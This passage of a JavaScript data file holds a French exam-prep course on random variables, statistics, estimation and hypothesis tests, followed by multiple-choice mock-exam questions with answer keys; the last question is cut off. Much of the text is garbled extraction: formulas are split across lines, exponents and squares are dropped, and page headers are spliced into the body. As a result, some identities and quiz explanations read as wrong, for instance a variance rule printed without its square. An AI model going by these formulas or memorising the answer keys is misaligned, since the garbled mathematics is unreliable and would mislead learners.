5. Variables Aléatoires (VA)`},{id:"5.1",c:5,t:"Caractéristiques générales",x:`❖ Définition – Espérance, variance, moments
        Fonction de répartition : F (x) = P(X ≤ x), croissante, de limites 0 en −∞ et 1 en +∞
         ; P(a < X ≤ b) = F (b) − F (a).
        Espérance RE(X) : moyenne théorique. Théorème de transfert : E(g(X)) =
                                                                                     P
                                                                                        g(xk )pk
         (discret) ou g(x)f (x) dx (continu).
        Variance : V(X) = E (X − EX)2 ; écart-type σ(X) = V(X).
                                            ~                     p

        Moment d'ordre k : E(X k ) ; moment centré : E[(X − EX)k ].
                                       X − EX
        Variable centrée réduite :            (espérance 0, variance 1).
                                         σ(X)

  ✿ Théorème / Propriété – Propriétés opératoires
  Pour a, b ∈ R :

        Linéarité : E(aX + bY ) = aE(X) + bE(Y ) (toujours vrai, même sans indépendance).
        K÷nig—Huygens : V(X) = E(X 2 ) − (E(X))2 .
        V(aX + b) = a2 V(X) (le +b disparaît, a passe au carré).
        V(X +Y ) = V(X)+V(Y )+2 cov(X, Y ) ; si X, Y indépendantes : V(X +Y ) = V(X)+V(Y )
         et E(XY ) = E(X)E(Y ).
                                                                         cov(X, Y )
        Covariance : cov(X, Y ) = E(XY ) − E(X)E(Y ) ; corrélation ρ =             ∈ [−1, 1].
                                                                         σ(X)σ(Y )

  ☞ Attention / Piège

  Indépendantes ⇒ cov(X, Y ) = 0, mais la réciproque est    fausse (ex : X ∼ U{−1, 0, 1} et Y = X 2
  : cov = 0 pourtant Y dépend de X ). Et V(X − Y ) = V(X) + V(Y ) (et non −) si indépendantes.`},{id:"5.2",c:5,t:"Variables aléatoires discrètes",x:`Une VA est discrète si elle prend un nombre fini ou dénombrable de valeurs. Loi : pk = P(X = xk )
       P                               P
avec    k pk = 1. Espérance : E(X) =    k xk pk .

  ➤ Exemple

  X prend les valeurs 0, 1, 2 avec probabilités 0,2; 0,5; 0,3. Alors E(X) = 0,5 + 0,6 = 1,1, E(X 2 ) =
  0,5 + 1,2 = 1,7, V(X) = 1,7 − 1,12 = 0,49.

                                 (VA)VARIABLES ALÉATOIRES CONTINUES (À DENSITÉ)
  ➔ Résumé Formules – Lois discrètes usuelles

   Loi                             Modélisation / P(X = k)                                 E(X)            V(X)
                                                        1                                  n+1             n2 −1
   Uniforme U({1..n})              équiprobabilité,
                                                        n                                   2               12
   Bernoulli B(p)                  succès/échec ; P(X = 1) = p                              p           p(1 − p)
                                                                              n k

   Binomiale B(n, p)               nb de succès sur n essais ind. ;
                                                                              k p (1 −      np         np(1 − p)
                                   p)n−k
   Géométrique G(p)                rang du 1
                                               er succès ; (1 − p)k−1 p                     1               1−p
                                                                                            p                p2
   Poisson P(λ)                    phénomènes rares ; e
                                                                −λ λk                       λ                λ
                                                                   k!
                                                                −K
                                                        (Kk )(Nn−k )                                                N −n
   Hypergéom. H(N, K, n)           tirage sans remise ;       N                            nK
                                                                                            N     nK
                                                                                                   N       1− K
                                                                                                              N     N −1
                                                             (n)

  ✿ Théorème / Propriété – Propriétés des lois discrètes

       B(n, p) = somme de n Bernoulli(p) indépendantes. Stabilité : B(n, p) + B(m, p) = B(n +
        m, p) (indép.).
       Stabilité de Poisson : P(λ1 ) + P(λ2 ) = P(λ1 + λ2 ) (indép.).
       Sans mémoire de la géométrique : P(X > m + k | X > m) = P(X > k).
       Approximation : B(n, p) ≈ P(np) si n ≥ 30, p ≤ 0,1, np < 10 ; H(N, K, n) ≈ B(n, K/N )
        si N ≥ 10n.

                                                  Loi binomiale B(10; 0,5)

                         0.2
              P(X = k)

                         0.1

                               0    1      2      3         4      5     6         7   8     9    10
                                                                   k`},{id:"5.3",c:5,t:"Variables aléatoires continues (à densité)",x:`R +∞
Une VA est à densité s'il existe f ≥ 0 avec
                                                      −∞ f (x) dx = 1.
                     Rb
    P(a ≤ XR ≤ b) = a f (x) dx ; P(X = c) = 0 pour tout c.
              x
    F (x) = −∞ f (t) dt et F ′ (x) = f (x) (aux points de continuité).
    E(X) = xf (x) dx ; E(X 2 ) = x2 f (x) dx ; V(X) = E(X 2 ) − E(X)2 .
             R                       R

    Médiane m : F (m) = 21 .

  ➤ Exemple
                                                                        R1     3 dx = 3 , E(X 2 ) =
                                                                                                      R1         3
  f (x) = 3x2 sur [0, 1] (0 ailleurs) : F (x) = x3 , E(X) =             0 3x          4
                                                                                                       0 3x dx = 5 ,
                3     9     3
  donc V(X) =
                5 − 16 = 80 .

 ➔ Résumé Formules – Lois continues usuelles

  Loi                      Densité f (x)                                       E(X)         V(X)
                            1                                                   a+b         (b−a)2
  Uniforme U([a, b])
                           b−a sur [a, b]                                        2            12
  Exponentielle E(λ)       λe−λx si x ≥ 0                                        1
                                                                                 λ
                                                                                              λ2
                                    (x−µ)2
  Normale N (µ, σ
                      2)    √1 e−     2σ 2                                        µ           σ2
                           σ 2π
  Khi-deux χ (n)           somme de n carrés de N (0, 1) ind.                     n           2n
                             p                                                             n
  Student t(n)             Z/ χ2 (n)/n (sym., queues lourdes)                 0 (n > 1)   n−2 (n > 2)

 ✿ Théorème / Propriété – Loi exponentielle

 F (x) = 1 − e−λx pour x ≥ 0. Elle est sans mémoire : P(X > s + t | X > s) = P(X > t) = e−λt .
 C'est la loi des temps d'attente entre deux événements d'un processus de Poisson de taux λ (et
 E(λ) est le cas continu de la géométrique).

 ✿ Théorème / Propriété – Loi normale
     Courbe en cloche symétrique par rapport à µ ; mode = médiane = moyenne = µ.
     Centrage-réduction : si X ∼ N (µ, σ 2 ) alors Z = X−µ                             x−µ
                                                          σ ∼ N (0, 1), et P(X ≤ x) = Φ σ     .
     Φ(−x) = 1 − Φ(x) ; P(|Z| ≤ x) = 2Φ(x)     −  1 .
     Stabilité : Xi ∼ N (µi , σi2 ) indép. ⇒
                                              P           P          P 2 2
                                                ai Xi ∼ N   a i µi ,  ai σi .
     Règle 68—95—99,7 : P(|X − µ| ≤ kσ) ≈ 0,683; 0,954; 0,997 pour k = 1, 2, 3.

                                 Loi N (0, 1) : aire centrale = 95% entre ±1,96

                0.4
         φ(z)

                0.2

                  −4       −3         −2     −1         0         1       2           3      4
                                                        z

 ★ Astuce Concours – Quantiles à retenir
 u0,90 = 1,282 ; u0,95 = 1,645 (unilat. 5%) ; u0,975 = 1,96 (bilat. 5%) ; u0,995 = 2,576 (bilat. 1%).
 Valeurs de Φ : Φ(1) = 0,8413, Φ(2) = 0,9772, Φ(3) = 0,9987.`},{id:"5.4",c:5,t:"Couples de variables aléatoires",x:`❖ Définition – Loi conjointe, marginales, indépendance
 Pour un couple discret (X, Y ) : loi conjointe pij = P(X = xi , Y = yj ) ; marginales P(X = xi ) =
 P
   j pij . X, Y sont indépendantes ⇐⇒ pij = P(X = xi )P(Y = yj ) pour tout (i, j) (cas continu :
 fX,Y = fX fY ). Loi conditionnelle : P(X = xi |Y = yj ) = pij /P(Y = yj ).`},{id:"5.5",c:5,t:"Inégalités et théorèmes limites",x:`✿ Théorème / Propriété – Inégalités de concentration

                                                  E(X)
     Markov : X ≥ 0, a > 0 : P(X ≥ a) ≤               .
                                                    a
                                                              V(X)
     Bienaymé—Tchebychev : P(|X − EX| ≥ ε) ≤                      .
                                                               ε2

 ✿ Théorème / Propriété – Loi des grands nombres (LGN)
                                                                        P
 Si Xi sont i.i.d. d'espérance µ et de variance finie, alors X̄n −
                                                                → µ : la moyenne empirique converge
 vers l'espérance. (Justifie l'estimation par fréquence empirique.)

 ✿ Théorème / Propriété – Théorème Central Limite (TCL)
                                                                2 finie. Avec S
                                                                                            P
 Soient X1 , . . . , Xn i.i.d. d'espérance µ et de variance σ                         n =       Xi et X̄n = Sn /n :

                X̄n − µ L                                       «       2
                                                                            »
                   √ −−−→ N (0, 1),            soit X̄n ≈ N         µ, σn       , Sn ≈ N (nµ, nσ 2 ).
                 σ/ n n→∞

 En pratique valable dès que n ≥ 30.

 ✿ Théorème / Propriété – De Moivre—Laplace : binomiale → normale

 Si X ∼ B(n, p) avec n ≥ 30, np ≥ 5, n(1!− p) ≥ 5 : X ≈ N (np, np(1 − p)). Correction de
                            k + 0,5 − np
 continuité : P(X ≤ k) ≈ Φ p             .
                              np(1 − p)

 partie III
Statistiques

6. Statistiques descriptives et régression`},{id:"6.1",c:6,t:"Paramètres d'une série",x:`❖ Définition – Position et dispersion
 Pour x1 , . . . , xn :

      Moyenne x̄ = n1          xi ; médiane (valeur centrale, robuste aux valeurs extrêmes) ; mode
                            P
        (valeur la plus fréquente).
      Variance s2x = n1 (xi − x̄)2 = x2 − x̄2 ; écart-type sx = s2x .
                        P                                       p

      Quartiles Q1 , Q3 ; écart interquartile Q3 − Q1 ; étendue max − min.
      Coecient de variation CV = sx /x̄.`},{id:"6.2",c:6,t:"Séries statistiques doubles et régression linéaire",x:`❖ Définition – Covariance et corrélation empiriques
                                                       sxy
 sxy = n1
              P
               (xi − x̄)(yi − ȳ) = xy − x̄ ȳ et r =       ∈ [−1, 1] (|r| proche de 1 : forte relation
                                                      sx sy
 linéaire).

 ✿ Théorème / Propriété – Droite des moindres carrés

                                         (yi − axi − b)2 est donnée par
                                        P
 La droite y = ax + b qui minimise

                                              sxy
                                         a=       ,    b = ȳ − a x̄.
                                              s2x

 Elle passe par le point moyen (x̄, ȳ). Le coecient de détermination est R
                                                                               2 = r 2 (part de variance

 expliquée).

 ➤ Exemple
                                                                        2        2
 Points (1, 2), (2, 3), (3, 5), (4, 4), (5, 6) : x̄ = 3, ȳ = 4, sxy = 1,8, sx = 2, sy = 2. Donc a = 0,9,
 b = 4 − 2,7 = 1,3, r = 0,9 et R2 = 0,81.

 ☞ Attention / Piège

 Corrélation ̸= causalité. Un r proche de 0 n'exclut pas une relation non linéaire (ex. parabole).

7. Estimation et Intervalles de Confiance`},{id:"7.1",c:7,t:"Estimateurs",x:`❖ Définition – Estimateur
 Soit un échantillon X1 , . . . , Xn i.i.d. de loi dépendant d'un paramètre inconnu θ . Un estimateur
 Tn de θ est une VA fonction de l'échantillon.
       Biais : B(Tn ) = E(Tn ) − θ. Si B = 0 : sans biais. Si B → 0 : asymptotiquement sans biais.
       Risque quadratique (MSE) : E((Tn − θ)2 ) = V(Tn ) + B(Tn )2 .
       Convergent : Tn −
                             P
                        → θ. Il sut que B(Tn ) → 0 et V(Tn ) → 0.

 ➔ Résumé Formules – Estimateurs usuels
       Moyenne : X̄ = n1                      E(X̄) = µ, V(X̄) = σ 2 /n.
                          P
                             Xi est sans biais,P
       Variance empirique (biaisée) : S = n (Xi −
                                        2    1
                                                      X̄)2 , E(S 2 ) = n−1  2
                                                                        n σ .
       Variance corrigée (sans biais) : S = n−1 (Xi − X̄) , E(S ) = σ 2 (le n − 1 est très
                                           ∗2     1 P             2      ∗2

        important !).

       Proportion : p̂ = nb densuccès , sans biais, V(p̂) = p(1−p)
                                                                n .`},{id:"7.2",c:7,t:"Construction d'estimateurs",x:`✎ Méthode – Méthode des moments
 Egaler moment théorique et moment empirique : résoudre               E(X) = X̄ en θ. Exemple : X ∼
 U([0, θ]), EX = θ/2 ⇒ θ̂ = 2X̄ .

 ✎ Méthode – Maximum de vraisemblance (EMV)

      Vraisemblance L(θ) =
                                 Qn                                                               ′
 1)                               i=1 f (xi ; θ). 2) Passer au log : ℓ(θ) = ln L(θ). 3) Résoudre ℓ (θ) = 0
 et vérifier que c'est un maximum.

 ➤ Exemple – EMV usuels

       Bernoulli(p) : p̂ = X̄ . Poisson(λP
                                          ) : λ̂ = X̄ .
       Exponentielle(λ) : ℓ = n ln λP− λ xi ⇒ λ̂ = 1/X̄ .
       Normale : µ̂ = X̄ et σ̂ 2 = n1 (Xi − X̄)2 (biaisé).

 ✍ Remarque – Lien avec l'IA
 Minimiser l'  entropie croisée   d'un classifieur = maximiser la vraisemblance d'un modèle de
 Bernoulli/catégoriel ; la régression par moindres carrés = EMV avec bruit gaussien.`},{id:"7.3",c:7,t:"Intervalles de confiance",x:`Un IC de niveau 1−α est un intervalle aléatoire contenant la vraie valeur du paramètre avec probabilité
1 − α (souvent 95%).

  ✿ Théorème / Propriété – Lois d'échantillonnage (Fisher)

  Pour un échantillon gaussien N (µ, σ
                                             2) :

                  X̄ − µ                    X̄ − µ                        (n − 1)S ∗2
                     √ ∼ N (0, 1),             √ ∼ t(n − 1),                          ∼ χ2 (n − 1).
                  σ/ n                      S∗/ n                             σ2

  ➔ Résumé Formules – Formules des IC (niveau 1 − α)
                                                   σ
       Moyenne, σ connu (ou n ≥ 30) : X̄ ± u1−α/2 √ (σ remplacé par S ∗ si inconnu et n
                                                    n
        grand).
                                                                         S∗
       Moyenne, σ inconnu, gaussien, n petit : X̄ ± tn−1, 1−α/2 √ .
                                                          r               n
                                                            p̂(1 − p̂)
       Proportion (np̂ ≥ 5, n(1 − p̂) ≥ 5) : p̂ ± u1−α/2              .
                   "                         #                  n
                     (n − 1)S ∗2 (n − 1)S ∗2
       Variance :              ,                      2
                                                 avec χ à n − 1 ddl.
                       χ21−α/2       χ2α/2

  ➤ Exemple

  n = 100, x̄ = 50, s∗ = 10, niveau 95% : IC = 50 ± 1,96 × 10
                                                           10 = [48,04; 51,96].

  ★ Astuce Concours – Taille d'échantillon
                                                    «u
                                                      1−α/2 σ
                                                                »2
  Pour une marge d'erreur e sur µ : n ≥                              . Pour une proportion (pire cas p =
                                                         e                                                 2) :
       u21−α/2
  n≥             . Ex : e = 3%, 95% ⇒ n ≥ 1068 (sondage classique). Plus n est grand, plus l'IC est
         4e2     √
  étroit (en 1/      n) ; plus le niveau est élevé, plus il est large.

  ☞ Attention / Piège

  Un IC à 95% ne signifie       pas "le paramètre a 95% de chances d'être dans cet intervalle observé" :
  c'est la procédure qui capture le vrai paramètre dans 95% des échantillons.

8. Tests d'Hypothèses
 ❖ Définition – Terminologie
 On confronte deux hypothèses :

       H0 (nulle) : situation de référence (statu quo, égalité). H1 (alternative) : ce qu'on cherche
        à montrer.
       Erreur de 1re espèce α = P(rejeter H0 | H0 vraie) (niveau du test, souvent 5%).
       Erreur de 2e espèce β = P(ne pas rejeter H0 | H0 fausse).
       Puissance : 1 − β . Diminuer α fait augmenter β (compromis) ; augmenter n améliore la
        puissance.
       Région critique : ensemble des valeurs de la statistique de test conduisant au rejet de H0 .
        Test bilatéral (H1 : µ ̸= µ0 ) ou unilatéral (H1 : µ > µ0 ou <).

 ✎ Méthode – Démarche d'un test
 1) Poser H0 , H1 . 2) Choisir α et la statistique de test. 3) Déterminer la loi de la statistique sous
 H0 et la région critique. 4) Calculer la valeur observée. 5) Conclure (rejet ou non-rejet de H0 ).

 ➔ Résumé Formules – Statistiques de test usuelles

  Test                                 Statistique sous H0                                   Loi
                                             X̄ − µ0
  Moyenne (σ connu ou n ≥ 30)          Z=        √                                           N (0, 1)
                                              σ/ n
                                             X̄ − µ0
  Moyenne (σ inconnu, gaussien)        T = ∗ √                                               t(n − 1)
                                             S / n
                                                  p̂ − p0
  Proportion                           Z=p                                                   N (0, 1)
                                                p0 (1 − p0 )/n
                                                  X̄1 − X̄2
  Deux moyennes (ind., grands n)       Z=p 2                                                 N (0, 1)
                                                σ1 /n1 + σ22 /n2
                                  2                 (O − E)2
                                       χ2obs =                                               χ2 (ddl)
                                               P
  Adéquation / indépendance χ
                                                       E

 ddl du χ
            2 : k−1 (adéquation, k classes, − nb de paramètres estimés) ; (r−1)(c−1) (indépendance,

 tableau r × c). Conditions : effectifs théoriques E ≥ 5.

 ➤ Exemple
                                                                      52−50
 n = 64, x̄ = 52, σ = 8, H0 : µ = 50 contre H1 : µ ̸= 50, α = 5%. Z = 8/√
                                                                             = 21 = 2 > 1,96 : on
 rejette H0 . La p-value vaut 2(1 − Φ(2)) = 2 × 0,0228 ≈ 0,0455 < 0,05.

 ★ Astuce Concours – La p-value
 La   p-value est la probabilité, sous H0 , d'observer un résultat au moins aussi extrême que celui
 obtenu.
 Si p-value ≤ α    =⇒ on rejette H0 (résultat statistiquement significatif ). Si p-value > α =⇒ on
 ne peut pas rejeter H0 .

 Dualité IC/test : on rejette H0 : µ = µ0 au niveau α ⇐⇒ µ0 ∈/ IC de niveau 1 − α.

 ☞ Attention / Piège
 La p-value n'est   pas la probabilité que H0 soit vraie. Ne pas rejeter H0 ne prouve pas H0 : on dit
 "on ne peut pas rejeter H0 ", jamais "on accepte H0 ".

       partie IV
Annexes et Entraînement

9. Formulaire de synthèse et erreurs classiques`},{id:"9.1",c:9,t:"Tables utiles",x:`z     0      0,5           1         1,28           1,645       1,96          2          2,326   2,576     3

        Φ(z)   0,5   0,6915    0,8413     0,8997             0,95        0,975       0,9772       0,99    0,995   0,9987

                       ddl                           5          10          20          30          ∞
                       t0,975 (Student)         2,571         2,228       2,086       2,042       1,960

                              ddl         1              2           3           4            5

                              χ20,95    3,841    5,991          7,815       9,488          11,070`},{id:"9.2",c:9,t:"Rappels d'analyse utiles",x:`➔ Résumé Formules – Séries et intégrales

     Série géométrique :               k =    1            k−1 =   1
                              P                     P
                                k≥0 q                k≥1 kq              (|q| < 1).
                                              1−q ,               (1−q)2
                                 k
     Exponentielle : eλ = k≥0 λk! (donne
                           P               P
                                              P(X = k) = 1 pour Poisson).
      R +∞ −λx            R +∞
     0 λe        dx = 1 ; 0 xλe   −λx      1
                                       dx = λ (intégration par parties).
      R +∞ −x2 /2       √
     −∞ e        dx = 2π (intégrale de Gauss).`},{id:"9.3",c:9,t:"Erreurs classiques à éviter",x:`☞ Attention / Piège – Top 10

   1. det(λA) = λn det A et non λ det A.
           T      T T
   2. (AB) = B A et (AB)
                               −1 = B −1 A−1 (ordre inversé).

   3. Somme des VP = Tr, produit des VP = det.
   4. Diagonalisable ̸= n VP distinctes (c'est seulement susant).
   5. Incompatible ̸= indépendant.
   6. V(aX + b) = a V(X) ; V(X − Y ) = V(X) + V(Y ) si indép.
   7. Non-corrélé ̸= indépendant.
   8. Diviser par n − 1 (pas n) pour l'estimateur sans biais de la variance.
   9. Loi normale : toujours centrer-réduire avec σ (et non σ ) au dénominateur.
  10. Ne jamais dire "on accepte H0 " ; p-value ̸= P(H0 ).

10. Examen Blanc 1 – Algèbre Linéaire & Prob-
abilités
QCM de concours. Une seule bonne réponse par question. Diculté croissante.`},{id:"12.1",c:12,t:"Explications des Méthodes Mathématiques",x:`[Résolution d'un Système Linéaire – Pivot de Gauss] Pour résoudre AX = B :

  1. Écrire la   matrice augmentée (A|B).
  2. Utiliser des opérations sur les lignes (Li ← λLi + µLj ) pour obtenir une matrice      échelonnée.
  3. Interpréter le résultat :

         Une ligne (0 0 . . . 0 | c) avec c ̸= 0 ⇒ Aucune solution (Système incompatible).
         Autant de pivots que d'inconnues ⇒ Solution unique.
         Moins de pivots que d'inconnues ⇒ Infinité de solutions (introduire des paramètres).
[Probabilités Conditionnelles et Bayes]

    Définition : P (A | B) = P P(A∩B)
                                 (B) (Probabilité de A sachant B ).

    Formule des probabilités totales : Pour découper un problème complexe. Si B1 , B2 . . . Bn
     forment une partition de l'univers :
     P (A) = P (A | B1 )P (B1 ) + P (A | B2 )P (B2 ) + · · · + P (A | Bn )P (Bn ).
    Théorème de Bayes : Pour inverser le conditionnement :
     P (B | A) = P (A|B)P
                     P (A)
                           (B)
                               .

[Tests d'Hypothèses – Démarche]

  1. Poser H0 (hypothèse nulle, souvent "il n'y a pas d'effet") et H1 (hypothèse alternative).

  2. Fixer le seuil de signification α (erreur de type I, souvent 5%).

  3. Calculer la   statistique de test à partir de l'échantillon (ex: Z ou T ).
  4. Conclure :

         Si p-valeur ≤ α (ou stat dans la zone de rejet) ⇒ Rejet de H0 .
         Si p-valeur > α ⇒ On ne rejette pas H0 (on ne dit jamais "on accepte H0 ").`},{id:"12.2",c:12,t:"Définitions Mathématiques à mémoriser",x:`❖ Définition Glossaire Algèbre et Probas

    Terme                        Définition
    Application linéaire         Fonction f telle que f (u + v) = f (u) + f (v) et f (λu) = λf (u).
    Matrice Inversible           Matrice carrée A possédant un inverse A
                                                                              −1 tel que AA−1 = I .

    Déterminant                  Valeur associée à une matrice carrée. Inversible ⇔ det(A) ̸= 0.
    Valeur propre (λ)            Scalaire tel que AX = λX (pour un vecteur propre X ̸= 0).

                                        12.3. RÈGLES
                                              ET NOTIONS
                                                     FONDAMENTALES
                                                         À MÉMORISERÀ MÉMORISER

   Base                           Famille de vecteurs    libre (linéairement indépendante) et généra-
                                  trice.
   Indépendance                   Deux     événements    A, B   sont   indépendants    si   P (A ∩ B) =
                                  P (A)P (B).
   Incompatibilité                Deux événements A, B sont incompatibles si A∩B = ∅ (ne peuvent
                                  se réaliser en même temps).
   Variable Aléatoire             Fonction qui associe un réel à chaque issue d'une expérience.
   Espérance E(X)                 Moyenne théorique d'une variable aléatoire.
   Variance V (X)                 Mesure de la dispersion de X autour de son espérance.

   p-valeur (p-value)             Probabilité d'observer des données au moins aussi extrêmes que
                                  celles de l'échantillon,   si H0 est vraie.
   Intervalle de confiance         Plage de valeurs ayant une probabilité fixée (ex: 95%) de contenir
                                  le vrai paramètre de la population.`},{id:"12.3",c:12,t:"Règles fondamentales à mémoriser",x:`★ Astuce Concours 20 règles d'or Mathématiques
    1. Rang d'une matrice : nb maximal de colonnes (ou lignes) linéairement indépendantes.

    2. Pour une matrice n × n : inversible ⇔ det(A) ̸= 0 ⇔ rang(A) = n ⇔ 0 n'est pas valeur
         propre.

    3.   det(AB) = det(A) det(B) et det(A−1 ) = 1/ det(A).
    4. Théorème du rang : dim(ker f ) + dim(Imf ) = dim(E).

    5. Diagonalisation : une matrice est diagonalisable si la somme des dimensions des sous-espaces
         propres est égale à n.

    6. Probas : P (A ∪ B) = P (A) + P (B) − P (A ∩ B).

    7. Linéarité de l'espérance : E(aX + bY ) = aE(X) + bE(Y ) (toujours vrai).
    8. Variance : V (aX + b) = a V (X). (Attention, le +b disparaît, le a est au carré).

    9.   V (X + Y ) = V (X) + V (Y ) UNIQUEMENT si X et Y sont indépendantes (ou non
         corrélées).

   10. Formule de König-Huygens : V (X) = E(X
                                                         2 ) − (E(X))2 .

   11. Loi Binomiale B(n, p) : n épreuves indépendantes, P (succès) = p. E(X) = np, V (X) =
         np(1 − p).
   12. Loi de Poisson P(λ) : événements rares. E(X) = V (X) = λ.

   13. Loi Normale Standard N (0, 1) : symétrique autour de 0. Règle des 68-95-99.7.

   14. Théorème Central Limite : la somme de n variables i.i.d. tend vers une loi Normale quand
         n est grand.
                                                   VP                                VP
   15. Matrice de confusion : Précision =
                                                V P +F P . Rappel (Sensibilité) = V P +F N .
   16. Régression : le coecient de corrélation r (entre -1 et 1) mesure la           force de la relation
         linéaire.
   17.   r2 (coecient de détermination) : proportion de la variance de Y expliquée par X .
   18. Erreur de type 1 (α) : Rejeter H0 alors qu'elle est vraie (Faux Positif ).

   19. Erreur de type 2 (β ) : Ne pas rejeter H0 alors qu'elle est fausse (Faux Négatif ).

                                             ET NOTIONS
                                                   PIÈGES ÀFRÉQUENTS
                                                             MÉMORISERAU CONCOURS

   20. Puissance d'un test : 1 − β , probabilité de rejeter correctement H0 .`},{id:"12.4",c:12,t:"Pièges fréquents au concours",x:`☞ Attention / Piège 10 pièges classiques Mathématiques

    1. Confondre événements     incompatibles (A ∩ B = ∅) et indépendants (P (A ∩ B) =
       P (A)P (B)).
    2. Croire que E(X · Y ) = E(X) · E(Y ). Faux en général ! (Vrai seulement si X, Y indépen-
       dantes).
    3. Oublier le carré dans V (aX) = a V (X).

    4. Appliquer V (X + Y ) = V (X) + V (Y ) sans vérifier l'indépendance. S'il y a dépendance, c'est
       V (X) + V (Y ) + 2Cov(X, Y ).
    5. Interpréter la p-valeur comme la probabilité que H0 soit vraie. C'est faux ! (C'est la proba
       d'observer les données sachant que H0 est vraie).

    6. Dire "On accepte H0 ". On ne peut jamais prouver H0 , on dit "On ne peut pas rejeter H0 "
       (manque de preuves).

    7. Oublier qu'une matrice peut être inversible même si elle a des valeurs propres complexes.
       (Tant que λ ̸= 0).

    8. Régression : Déduire une relation de cause à effet à partir d'une corrélation forte. (Corréla-
       tion n'est pas causalité).

    9. Oublier les constantes lors du calcul de primitive/intégrale ou résolution d'équa-diff.

   10. Division par zéro déguisée lors de la réduction d'un système avec des paramètres (x/a
       suppose a ̸= 0).`},{id:"12.5",c:12,t:"Résoudre un exercice sans sauter d'étapes",x:` Système linéaire : appliquer des opérations équivalentes sur les lignes de la matrice augmentée
    ; pivoter, échelonner, puis interpréter les pivots et variables libres. Une ligne 0 = c ̸= 0 signifie
     aucune solution.

   Probabilités conditionnelles : traduire «sachant B » par P (A | B) = P (A ∩ B)/P (B). Pour
     inverser le conditionnement, utiliser Bayes avec les cas qui forment une partition.

   Variable aléatoire : identifier la loi, ses paramètres et le support avant d'utiliser une formule ;
     vérifier si l'on demande une probabilité, une espérance ou une variance.

   Test statistique : formuler H0 et H1 , choisir la statistique et sa loi sous H0 , fixer le seuil,
     calculer la p-valeur ou comparer au seuil critique, puis conclure dans le contexte.

   Régression : les coecients décrivent une association conditionnelle au modèle ; ne pas conclure
     à une causalité sans hypothèses et dispositif d'identification appropriés.

  ➔ Résumé Formules Définitions et règles à mémoriser
  Une application linéaire vérifie f (u + v)   = f (u) + f (v) et f (λu) = λf (u). Pour une matrice
  carrée, inversibilité ⇔ déterminant non nul ⇔ rang maximal. E(X + Y ) = E(X) + E(Y ) ; si
  X, Y sont indépendantes, Var(X + Y ) = Var(X) + Var(Y ). Ne pas confondre indépendance et
  incompatibilité, ni intervalle de confiance et intervalle contenant une valeur individuelle. Une

                                12.5. RÉSOUDRE
                                       RÈGLES ETUNNOTIONS
                                                   EXERCICE
                                                          À MÉMORISER
                                                             SANS SAUTER D'ÉTAPES

  p-valeur n'est pas P (H0 | données).`}],nh=[{q:"Soit A ∈ Mn (R). Si det(A) = 2, que vaut det(3A) ?",o:["6","2 × 3n","3 × 2n","18"],a:1,e:"B) 2 × 3n . det(λA) = λn det(A), donc det(3A) = 3n × 2. Piège hyper classique."},{q:"Quel est le rang d'une matrice A de dimension 4 × 5 ?",o:["Exactement 4","Exactement 5","Au maximum 4","Au maximum 5"],a:2,e:"C) Au maximum 4. rg(A) ≤ min(n, p) = min(4, 5) = 4."},{q:"Soit f un endomorphisme de R . Si Ker(f ) est une droite, quelle est la dimension de Im(f ) ?",o:["1","2","3","0"],a:1,e:"B) 2. Théorème du rang : 3 = 1 + dim(Im f ) =⇒ dim(Im f ) = 2."},{q:"Une matrice A ∈ M3 (R) a pour valeurs propres 1, 2 et −3. Que vaut son déterminant ?",o:["0","6","−6","On ne peut pas savoir"],a:2,e:"C) −6. Le déterminant est le produit des VP : 1 × 2 × (−3) = −6 (la trace serait la somme = 0)."},{q:"Combien d'anagrammes peut-on former avec le mot INFO  ?",o:["4","16","24","256"],a:2,e:"C) 24. 4 lettres distinctes : 4! = 24."},{q:"On lance deux dés équilibrés à 6 faces. Probabilité d'obtenir une somme égale à 4 ?",o:["1/12","1/36","1/6","3/12"],a:0,e:"A) 1/12. |Ω| = 36 ; cas favorables : (1, 3), (2, 2), (3, 1) soit 3. P = 3/36 = 1/12."},{q:"A et B sont indépendants, P(A) = 0,4, P(B) = 0,5. Que vaut P(A ∪ B) ?",o:["0,9","0,2","0,7","1,0"],a:2,e:"C) 0,7. P(A ∩ B) = 0,4 × 0,5 = 0,2, donc P(A ∪ B) = 0,4 + 0,5 − 0,2 = 0,7."},{q:`Dépistage d'une maladie rare (prévalence 1%) : le test est positif pour 99% des malades et donne
 5% de faux positifs. Quelle formule donne la probabilité d'être malade sachant que le test est






 positif ?`,o:["Probabilités totales","Théorème de Bayes","Formule de K÷nig","Loi normale"],a:1,e:"B) Théorème de Bayes. On connaît P(+ | M ) et on cherche P(M | +) : inversion du condition- nement."},{q:"Dans le contexte de la question 8, que vaut approximativement P(M | +) ?",o:["99%","50%","16,7% (1/6)","5%"],a:2,e:"0,99 × 0,01 0,0099 1 C). P(M |+) = = = . 0,99 × 0,01 + 0,05 × 0,99 0,0594 6"},{q:"Combien d'anagrammes du mot MAMAN  ?",o:["120","60","30","20"],a:2,e:"5! 120 C) 30. = = 30 (deux M, deux A, un N). 2! 2! 4"},{q:`2 1
 Quelles sont les valeurs propres de A =                 ?
                                               1 2`,o:["2 et 1","1 et 3","0 et 4","2 (double)"],a:1,e:"B) 1 et 3. Tr = 4, det = 3 : λ2 − 4λ + 3 = (λ − 1)(λ − 3)."},{q:"Soit A ∈ Mn (R) symétrique. Laquelle de ces armations est vraie ?",o:["A n'est pas toujours diagonalisable","A est diagonalisable dans une base orthonormée","A a des valeurs propres complexes non réelles","det A = 0"],a:1,e:"B). Théorème spectral : A = P DP T avec P orthogonale et VP réelles."},{q:"Nombre de façons de choisir un comité de 2 personnes parmi 6 ?",o:["12","15","30","36"],a:1,e:"B) 15. L'ordre ne compte pas : 62 = 6×5 2 = 15."},{q:"A, B incompatibles avec P(A) = 0,5 et P(B) = 0,3. Alors :",o:["A et B sont indépendants","A et B ne sont pas indépendants","P(A ∩ B) = 0,15","On ne peut rien dire"],a:1,e:"B). Incompatibles ⇒ P(A ∩ B) = 0 ̸= 0,5 × 0,3 = 0,15 : donc non indépendants. 11. Examen Blanc 2 – Variables Aléatoires & Statis- tiques"},{q:"L'espérance d'une loi binomiale B(100; 0,2) est :",o:["100","20","16","0,2"],a:1,e:"B) 20. E(X) = np = 100 × 0,2 = 20 (la variance vaut np(1 − p) = 16)."},{q:"Soit X une VA avec V(X) = 4. Que vaut V(−2X + 3) ?",o:["−5","−8","11","16"],a:3,e:"D) 16. V(aX + b) = a2 V(X) = (−2)2 × 4 = 16 ; la constante +3 n'affecte pas la dispersion."},{q:`Quelle loi modélise généralement le nombre d'appels reçus par un standard téléphonique en une
